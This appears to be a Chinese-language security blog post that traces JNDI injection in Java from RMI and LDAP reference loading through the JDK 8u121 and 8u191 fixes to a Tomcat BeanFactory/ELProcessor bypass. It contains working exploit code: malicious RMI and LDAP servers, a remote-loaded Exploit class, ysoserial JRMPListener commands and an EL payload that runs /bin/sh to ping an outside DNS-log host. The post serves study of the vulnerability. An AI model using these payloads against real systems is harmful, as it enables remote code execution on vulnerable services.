---
layout: mypost
title: "History of JNDI injection"
categories: [Java安全]
---

## 前言

截止目前，除 DNSURL 链，其他的攻击手法基本都要靠一些依赖才可以实现，但是今天的主角-->JNDI 注入，它只需要 JDK 版本满足要求即可，是完全不需要依赖的，这也是这个漏洞很伟大的地方。这篇文章就沿着时间线记录，从基于 RMI 的 JNDI 注入-->JDK 8u121 的修复-->基于 LDAP 的 JNDI 注入-->JDK 8u191 的修复-->高版本的绕过。

## 准备工作

前言中也提到，一个完全基于 JDK 原生代码的漏洞，不需要什么特别的环境，准备几个不同的 JDK 版本即可。

- JDK 8u65
- JDK 8u121
- JDK 8u191

## JNDI 概述

JNDI 全称 Java Naming and Directory Interface，是 Java 提供的 Java 命名和目录接口，JNDI 没有“服务端”的概念，它不是服务，只是一个客户端 API 框架。它的具体实现，可以用下图来表示：

![](image-354.png)

像一个管理者，管理着一堆服务，当 Applications 需要使用这些服务时，它会根据 Applications 的请求，找到对应的服务，然后将结果返回给 Applications。从上图也可以看出，它设计支持多种服务协议（如 RMI、LDAP、DNS、CORBA 等），理论上可以扩展对 NIS、NDS 等目录服务的支持。但从 JDK 原生的实现来看，仅支持了 RMI、LDAP、DNS 和 CORBA 四种服务类型，具体如下-->

![](image-355.png)

四种服务中会着重分析 RMI 和 LDAP 这两种服务中存在的漏洞，DNS 和 CORBA 一笔带过。

![](22.png)

## 基础篇 - JNDI & RMI

对 RMI 整个过程较为熟悉，先拿它开刀。

### 过程分析

写一个通过 JNDI 接口，调用 RMI 服务的 Demo，代码如下：

服务端代码不变-->

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        HelloRemoteObject helloRemoteObject = new HelloRemoteObject();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("helloRemoteObject", helloRemoteObject);
        System.out.println("RMI Server is ready...");
    }
}
```

客户端代码做出如下修改-->

```java
import javax.naming.InitialContext;

public class JNDIRMIClient
{
    public static void main( String[] args ) throws Exception
    {
        String uri = "rmi://localhost:1099/helloRemoteObject";
        InitialContext initialContext = new InitialContext();
        IRemoteObject remoteObject = (IRemoteObject) initialContext.lookup(uri);
        System.out.println(remoteObject.sayHello("xxx"));
    }
}
```

运行成功输出`Hello xxx`，这么看貌似与之前的 RMI 调用没啥两样，唯一的区别就在于`InitialContext()`这个类，而此类的关键在于`lookup()`方法，跟一下它。

首先进入 getURLOrDefaultInitCtx 方法-->

![](image-356.png)

此方法根据传入的参数`rmi://localhost:1099/helloRemoteObject`成功返回了一个 rmiURLContext 对象，如下-->

![](image-357.png)

rmiURLContext 并无 lookup 方法，会调用它父类的 lookup 方法，如下-->

![](image-358.png)

![](image-359.png)

接着走到 rmiURLContext 类的 getRootURLContext 方法，如下-->

![](image-360.png)

其中调用 RegistryContext 类的构造方法，最终走到新建 Registry_Stub 类的构造方法，如下-->

![](image-361.png)

![](image-362.png)

![](image-363.png)

![](image-364.png)

之后一路 return 到最开始的位置，此时的 var2 值如下-->

![](image-365.png)

接着执行`var3.lookup(var2.getRemainingName());`，跟进去-->

![](image-366.png)

看到这里很清楚，通过 JNDI 接口调用 RMI 服务的过程，本质就是调用了原生的 RMI（自实现了 Registry_Stub，与 Registry 端通信拿到 Server_Stub），多做了一层封装而已。那当然，在 RMI 中所见到 Registry 攻击 Client 端的方式，在 JNDI 中也同样适用。打一个 ysoserial.exploit.JRMPListener 试试-->

```shell
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "ping 6y7d5.cxsys.spacestabs.top"

* Opening JRMP listener on 1099
Have connection from /127.0.0.1:60047
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

运行客户端代码，成功触发 DNS 请求，如下-->

![](image-48.png)

这并非 JNDI 注入，但同样是一个攻击点。若是常规的 RMI 调用，拿到 var2（Server_Stub）就结束了，但是通过 JNDI 接口调用 RMI 服务，仍有一步，回到主线，继续向下走-->

![](image-367.png)

跟进 decodeObject 方法-->

![](image-368.png)

`Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;`这行代码作用是判断 Server_Stub 是否为一个远程引用对象。若是，就会调用`getReference()`方法。显然，这里的 var1 只是一个普通的 helloRemoteObject 对象，所以不会执行`getReference()`方法，直接返回 var1。

接着进入`NamingManager.getObjectInstance()`方法-->

![](image-369.png)

上图中标记的代码块都没有执行，直接到如下位置-->

![](image-381.png)

跟进去-->

![](image-380.png)

由于 factories 是 null，createObjectFromFactories 方法也没有执行任何逻辑，最终返回 refInfo。

![](image-382.png)

通过 JNDI 接口调用 RMI 服务的过程到此结束，其中那独有的一步却是什么都没有干。之后的代码逻辑是客户端与服务端通信的过程，与 RMI 完全一致，其中的攻击手法不再赘述。

### 转机

上文整个过程中所暴露出的攻击点都是在基于 RMI 去做文章，其实 JNDI 注入的 Sink 就藏匿在没能去分析的那一部分，也就是那独有的一步-->decodeObject 方法！这个方法设计之初是为了让 JNDI 去处理 RMI 的注册中心绑定对象为 Reference 的这种情况，用引用对象去加载真正的对象，都在说 JNDI 支持解引用，它的原因其实是在这里。

Tips：Reference 即引用对象，和 C++的指针有异曲同工之妙，C++中函数传递参数时，面对数组、结构体这种较为复杂的数据结构，会选择传递一个地址，同样的在 Java 传输过程中面对很大很复杂的对象，可以选择传递对象的引用对象，之后根据引用对象去加载真正的对象。挺好的设计，提升了传输的效率。而有关 Reference 类详细的信息可参照-->[官方教程](https://doc.qzxdp.cn/jdk/20/zh/api/java.naming/javax/naming/Reference.html)

便捷的同时也带来了问题，进入 decodeObject 方法，跟进 getObjectInstance 方法，再跟进`getObjectFactoryFromReference(ref, f);`这行代码，如下-->

![](image-374.png)

其中使用 codebase 进行远程类加载，显然是存在风险的，而这就是 JNDI 注入的 Sink，也不用分析代码如何才能走到这一步，在 RMI 的注册中心中绑定一个合适的 Reference 对象，顺理成章的便可到达 Sink。何为合适？即选择合适的 Reference 构造函数，构造函数中要构造 classFactory 以及 classFactoryLocation，第三个、第四个均可以，如下-->

![](image-375.png)

### 注入

选取 Reference 类的第三个构造函数，编写利用代码如下：

RMIServer-->

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference(null,"Exploit","http://127.0.0.1:8000/");
        // 需要用 ReferenceWrapper 将 reference 包装
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("referenceWrapper",referenceWrapper);
    }
}
```

JNDIRMIClient-->

```java
import javax.naming.InitialContext;

public class JNDIRMIClient
{
    public static void main( String[] args ) throws Exception
    {
        String uri = "rmi://localhost:1099/referenceWrapper";
        InitialContext initialContext = new InitialContext();
        IRemoteObject remoteObject = (IRemoteObject) initialContext.lookup(uri);
    }
}
```

编译恶意类如下-->

```java
public class Exploit{
    static {
        try {
            java.lang.Runtime.getRuntime().exec("ping 6y7d5.cxsys.spacestabs.top");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

将恶意类放入`http://127.0.0.1:8000/`，运行 JNDIRMIClient，成功触发 DNS 请求，如下-->

![](image-48.png)

简单跟一下，其中仍有一处 RMI 的反序列化漏洞-->

![](image-376.png)

![](image-377.png)

这里其实客户端就已经与服务端通信了，调用服务端的 getReference 方法，拿到了 Reference 对象，熟悉的场景，当然也存在反序列化漏洞，这里不再赘述。

![](image-378.png)

再放一张 Sink 的图，如上，注入部分结束。

### 修复

代码不变，将 JDK 版本升级到 8u121，再次运行 JNDIRMIClient 结果出现如下报错-->

```shell
Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at rmi.JNDIRMIClient.main(JNDIRMIClient.java:11)
```

跟一下报错，显然是 JDK 官方做出了修复，在进入`NamingManager.getObjectInstance(var3, var2, this, this.environment);`这行代码之前加了一个判断，如下-->

![](image-383.png)

trustURLCodebase 变量的值在 JDK 8u121 版本之后默认值为 false，即默认情况下，不允许 Applications 加载不信任的远程类。但它只是在 RegistryContext 类里对`com.sun.jndi.rmi.object.trustURLCodebase`这个属性做了校验，但真正进行远程类加载的的`NamingManager.getObjectInstance(var3, var2, this, this.environment);`实际上没有做限制，算是一个隐患。

### 补充

难道 Reference 类的第二个构造函数没有风险吗？其实也能去打一次 RMI 的反序列化漏洞，给出利用代码如下：

RMIServer-->

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference(null, new StringRefAddr("URL", "rmi://localhost:9999/xxx"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("referenceWrapper",referenceWrapper);
    }
}
```

JNDIRMIClient-->

```java
import javax.naming.InitialContext;

public class JNDIRMIClient
{
    public static void main( String[] args ) throws Exception
    {
        String uri = "rmi://localhost:1099/referenceWrapper";
        InitialContext initialContext = new InitialContext();
        IRemoteObject remoteObject = (IRemoteObject) initialContext.lookup(uri);
    }
}
```

仍是去打一个 ysoserial.exploit.JRMPListener -->

```shell
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 "ping 6y7d5.cxsys.spacestabs.top"
* Opening JRMP listener on 9999
Have connection from /127.0.0.1:64829
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

运行客户端代码，成功触发 DNS 请求，如下-->

![](image-48.png)

前面的那两个 RMI 的攻击点都比这里简单易懂，且这个攻击点也没有去绕过什么限制 🚫，个人认为没有很大的实际意义，也是调试时偶然发现，仅供学习。

## 漏网之鱼 - JNDI & LDAP

### 漏洞分析

已经跟出经验了，举一反三，画个图总结一下-->

![](24.png)

要找 JNDI 注入，关键就是要找到 decodeObject 方法，不班门弄斧了，LDAP 的 decodeObject 方法如下-->

![](image-384.png)

跟进去可以发现代码逻辑只是根据不同的条件去返回不同对象，并没有像 RMI 那样将通过 Reference 对象去加载真正的对象的代码逻辑写在其中，这点是不同的，如下-->

![](image-385.png)

它的 Sink 在接收返回值代码的下方处，如下-->

![](image-386.png)

`DirectoryManager.getObjectInstance()`方法的代码逻辑与 RMI 的`NamingManager.getObjectInstance()`方法一致，存在远程类加载的攻击面，不再赘述。所以现在问题的关键在于 decodeObject 方法中是否做了过滤，更准确的来说，decodeObject 方法中第三个 if 是否做了过滤，是没有的，如下-->

![](image-387.png)

其中并没有看到 trustURLCodebase 相关的代码，是没有做限制的，所以绝对存在 JNDI 注入，写一个利用代码如下：

```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class JNDILDAPServer {

    private static final String LDAP_BASE = "dc=xxx,dc=com";

    public static void main(String[] args) {
        int port = 1389;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.setSchema(null);  // 关闭 schema 验证
            config.setEnforceAttributeSyntaxCompliance(false);
            config.setEnforceSingleStructuralObjectClass(false);

            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.startListening();

            ds.add("dn: dc=xxx,dc=com", "objectClass: top", "objectClass: domain", "dc: xxx");
            ds.add("dn: ou=xxxx,dc=xxx,dc=com", "objectClass: organizationalUnit", "ou: xxxx");

            // 注册一个 Reference 对象条目（按照 JNDI 加载规则）
            ds.add("dn: uid=xxxxx,ou=xxxx,dc=xxx,dc=com",
                    "objectClass: javaNamingReference",
                    "javaClassName: Exploit",
                    "javaFactory: Exploit",
                    "javaCodeBase: http://127.0.0.1:8000/");
            System.out.println("LDAP Server listening on 0.0.0.0:" + port);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

此时的客户端代码如下-->

```java
import javax.naming.InitialContext;

public class JNDILDAPClient {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://127.0.0.1:1389/uid=xxxxx,ou=xxxx,dc=xxx,dc=com");
    }
}
```

那个 Exploit.class 保持不变即可，之后启动 Ldap，将 JDK 版本切换到 JDK 8u121 运行 JNDILDAPClient 后，成功触发 DNS 请求，如下-->

![](image-48.png)

可以调试看一下 Sink 处，如下-->

![](image-414.png)

成功的加载到了 8000 端口下的 Exploit.class。

### 修复

关于 ldap 的修复是在 JDK 8u191 中，将 JDK 版本切换到 8u191，然后再次运行 JNDILDAPClient，DNSLog 平台这次并没有成功接收到请求，且没有任何报错，跟到 Sink 处看看-->

![](image-417.png)

继续向下跟-->

![](image-416.png)

在上图位置加入了过滤代码，可以看到这次的修复并不是像之前 JDK 8u121 那次一样仅在 RegistryContext 类中做了修复，这次的修复相当于做了个全局过滤器。至此之后，只依赖 JDK 源码的 JNDI 注入漏洞算是被完全修复了。

Tips：其中没有提到 CORBA 协议，这个协议是和 RMI 一样，在 JDK 8u121 版本就已经被修复了。

## 高版本绕过

要考虑到功能等诸多原因，就算是 JDK 8u191 的修复也并没有直接去将 loadClass 这个点给 Ban 掉，现在就是限制不能去远程加载一个类了，更严谨点的说法是去限制不能再去远程加载一个 Factory 了，之后的绕过总体上的思想是：既然无法去远程加载一个 Factory，那能不能本地去加载一个 Factory，然后这个 Factory 中有恶意的方法呢？答案是可行的！

先看正常去加载到一个 Factory 之后会发生什么事情？实际会跳回到 DirectoryManager 类的 getObjectInstance 方法，然后去调用这个 Factory 的 getObjectInstance 方法，如下-->

![](image-418.png)

那么就是要看看哪一个 Factory 类的 getObjectInstance 方法是存在可以利用的点的，找到 getObjectInstance 接口，查看它的实现，如下-->

![](image-419.png)

原生的 JDK 代码去实现 getObjectInstance 接口的类总共就 6 个，它们的 getObjectInstance 方法也是不存在什么可以利用的点的，那现在只能去找依赖了，而依赖肯定是优先选常见的，最终选择了 Tomcat 的 org.apache.naming.factory.BeanFactory 这个 Factory，导一个 Tomcat 8 的依赖，分析分析它的 getObjectInstance 方法-->

![](image-420.png)

上图有一处反射，也就是这次高版本绕过所用到的 Sink，首先来看 Bean，它是在如下位置创建的-->

![](image-421.png)

再从 beanClass 一步步向上跟，分别是-->

![](image-422.png)

实际上 Bean 是来自于 Object obj 的，同样的思路再去跟一下 method、valueArray 这两个值，它们最后也是从 obj 来的，这里就不赘述了。而 obj 就是来自于 JNDI 绑定的那个 Reference，如下-->

![](image-423.png)

所以相当于`method.invoke(bean, valueArray);`这一行代码是完全可控的，按照规范提前构建好 Reference 即可。

利用的时候有一个问题，这里相当于是一个受限的命令执行，何为受限？这里要去找一个只传一个 String 类型的参数却能命令执行的方法，且这个方法最好是 JDK 原生的，或者是常见的依赖。最后用的就是很熟悉的 el 表达式，而它也是 Tomcat 8 中自带的，非常合适，接下来去写一下利用的代码（拿 RMI 去写了）：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HighJDKRMILDAPServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "xxx=eval"));
        ref.add(new StringRefAddr("xxx", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','ping 6y7d5.cxsys.spacetab.top']).start()\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("referenceWrapper", referenceWrapper);
    }
}
```

然后 Client 端代码保持正常即可，如下-->

```java
import javax.naming.InitialContext;

public class JNDIRMIClient
{
    public static void main( String[] args ) throws Exception
    {
        String uri = "rmi://localhost:1099/referenceWrapper";
        InitialContext initialContext = new InitialContext();
        IRemoteObject remoteObject = (IRemoteObject) initialContext.lookup(uri);
    }
}
```

切换高版本的 JDK 运行（这里选择的是 JDK 8u411），JNDIRMIClient 类后成功触发 DNS 请求，如下-->

![](image-48.png)

简单跟一跟几个关键的点：

成功用 AppClassLoader 加载到了 BeanFactory-->

![](image-424.png)

开始调用 BeanFactory 的 getObjectInstance 方法-->

![](image-425.png)

Bean 变量成功被赋予 javax.el.ELProcessor-->

![](image-426.png)

method、valueArray 成功被赋予相应的值，后到达 Sink 处，RCE-->

![](image-427.png)

至此，成功在 JDK 8u411 的高版本 JDK 下绕过了修复！别的文章中也有提到利用 LDAP 直接返回一个恶意的序列化对象，JNDI 注入依然会对该对象进行反序列化操作，利用反序列化 Gadget 完成命令执行。这一点相当于就不是去打 Reference 了，相当于攻击的是之前提的 3 个 if 中的第一个 if，如下-->

![](image-428.png)

也挺好理解的，但就是需要受害机上面要有 CC 等的这种依赖了，条件有点苛刻吧，具体可以参照这篇文章去学习：[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)，这里就不展开记录了。

## 参考

[JNDI 注入与动态类加载](https://halfblue.github.io/2021/11/18/JNDI%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/)

[Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS 那些事儿（上）](https://paper.seebug.org/1091/)

[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)